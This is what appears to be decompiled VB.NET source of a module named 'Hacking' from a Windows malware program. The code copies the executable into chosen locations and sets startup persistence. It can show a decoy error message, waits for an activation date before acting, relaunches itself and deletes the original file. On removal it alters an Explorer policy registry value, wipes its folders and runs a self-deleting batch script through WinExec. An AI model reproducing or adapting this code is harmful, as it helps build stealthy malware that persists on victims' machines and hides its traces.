Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.IO
Imports System.Linq
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Main.Properties
Imports Microsoft.Win32

Namespace Main.Tools
	' Token: 0x0200003D RID: 61
	Friend Module Hacking
		' Token: 0x06000152 RID: 338 RVA: 0x0000BFAC File Offset: 0x0000A1AC
		Friend Sub InitSoftware(startMode As Config.StartModeType, arg As String)
			Try
				If startMode = Config.StartModeType.Debug Then
					MessageBox.Show(Resources.StartModeDebug)
				ElseIf arg <> Nothing Then
					If startMode = Config.StartModeType.DeleteItself Then
						arg = arg.Replace("?", " ")
						If Path.IsPathRooted(arg) AndAlso File.Exists(arg) Then
							Dim num As Integer = 0
							Dim flag As Boolean
							Do
								Dim fileNameWithoutExtension As String = Path.GetFileNameWithoutExtension(arg)
								Dim exeFolderPath As String = Directory.GetParent(arg).ToString()
								flag = Process.GetProcessesByName(fileNameWithoutExtension).FirstOrDefault(Function(p As Process) p.MainModule.FileName.StartsWith(exeFolderPath)) IsNot Nothing
								Thread.Sleep(100)
								num += 1
							Loop While flag AndAlso num < 100
							Thread.Sleep(300)
							If Not flag Then
								File.Delete(arg)
							End If
						End If
					End If
					If startMode = Config.StartModeType.ErrorMessage Then
						MessageBox.Show(Config.ErrorMessage, Config.ErrorTitle, MessageBoxButtons.OK, MessageBoxIcon.Hand)
					End If
					If Config.OnlyRunAfterSysRestart Then
						Environment.[Exit](0)
					End If
				Else
					Dim tempExePath As String = Config.TempExePath
					If Config.FinalExeRelativePath <> Nothing Then
						Dim text As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Path.GetFileName(Config.FinalExeRelativePath))
						Windows.SetStartup(Config.StartupMethod)
						If Application.ExecutablePath = Config.FinalExePath Then
							Return
						End If
						If Application.ExecutablePath = text Then
							Return
						End If
					End If
					If Hacking.ExeSmartCopy(Config.FinalExePath, True) Then
						Hacking.ExeSmartCopy(tempExePath, True)
					End If
					Dim text2 As String = Application.ExecutablePath.Replace(" ", "?")
					Process.Start(tempExePath, text2)
					Environment.[Exit](0)
				End If
			Catch
			End Try
		End Sub

		' Token: 0x06000153 RID: 339 RVA: 0x0000C15C File Offset: 0x0000A35C
		Friend Function ExeSmartCopy(targetExePath As String, overwrite As Boolean) As Boolean
			Try
				If Application.ExecutablePath = targetExePath Then
					Return False
				End If
				Dim parent As DirectoryInfo = Directory.GetParent(targetExePath)
				Directory.CreateDirectory(parent.ToString())
				File.Copy(Application.ExecutablePath, targetExePath, overwrite)
			Catch
			End Try
			Return True
		End Function

		' Token: 0x06000154 RID: 340 RVA: 0x0000C1B4 File Offset: 0x0000A3B4
		Friend Function ShouldActivate() As Boolean
			Return DateTime.Now > Config.ActiveAfterDateTime
		End Function

		' Token: 0x06000155 RID: 341 RVA: 0x0000C1D0 File Offset: 0x0000A3D0
		Friend Sub RemoveItself()
			If Config.StartMode = Config.StartModeType.Debug Then
				Environment.[Exit](0)
			End If
			Try
				Dim registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", True)
				registryKey.SetValue("NoDriveTypeAutoRun", 95)
				Windows.RemoveStartupRegistry(Config.FinalExePath)
				Dim hashSet As HashSet(Of String) = New HashSet(Of String)() From { Path.GetDirectoryName(Config.FinalExePath), Path.GetDirectoryName(Config.TempExePath), Config.WorkFolderPath }
				For Each text As String In hashSet
					Try
						If Directory.Exists(text) Then
							Directory.Delete(text, True)
						End If
					Catch ex As Exception
					End Try
				Next
				Dim text2 As String = Path.GetDirectoryName(Application.ExecutablePath) + "\DeleteItself.bat"
				Using streamWriter As StreamWriter = New StreamWriter(text2, False, Encoding.[Default])
					streamWriter.Write(":del" & vbCrLf & " del ""{0}""" & vbCrLf & "if exist ""{0}"" goto del" & vbCrLf & "del %0" & vbCrLf, Application.ExecutablePath)
				End Using
				Hacking.WinExec(text2, 0UI)
			Finally
				Environment.[Exit](0)
			End Try
		End Sub

		' Token: 0x06000156 RID: 342
		Public Declare Function WinExec Lib "kernel32.dll" (lpCmdLine As String, uCmdShow As UInteger) As UInteger
	End Module
End Namespace
